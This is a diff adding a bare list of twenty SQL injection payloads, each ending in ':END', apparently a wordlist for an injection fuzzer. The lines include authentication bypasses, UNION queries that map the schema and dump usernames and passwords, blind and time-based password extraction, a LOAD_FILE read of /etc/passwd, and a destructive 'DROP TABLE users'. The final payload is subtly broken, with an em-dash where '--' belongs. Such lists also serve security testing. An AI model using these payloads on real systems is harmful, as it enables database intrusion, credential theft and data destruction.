@@ -1,0 +1,20 @@
+' OR 1=1--:END
+' OR '1'='1:END
+' UNION SELECT null, null--:END
+' UNION SELECT 1, @@version--:END
+' UNION SELECT 1, table_name FROM information_schema.tables--:END
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--:END
+' UNION SELECT username, password FROM users--:END
+' AND SLEEP(5)--:END
+'; DROP TABLE users--:END
+' OR 1=1 LIMIT 1--:END
+' ORDER BY 1--:END
+' ORDER BY 3--:END
+' AND (SELECT COUNT(*) FROM users) > 0--:END
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--:END
+' UNION SELECT 1, LOAD_FILE('/etc/passwd')--:END
+' UNION SELECT 1, user()--:END
+' UNION SELECT 1, database()--:END
+' AND 1=IF(1=1, SLEEP(3), 0)--:END
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--:END
+' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()—:END
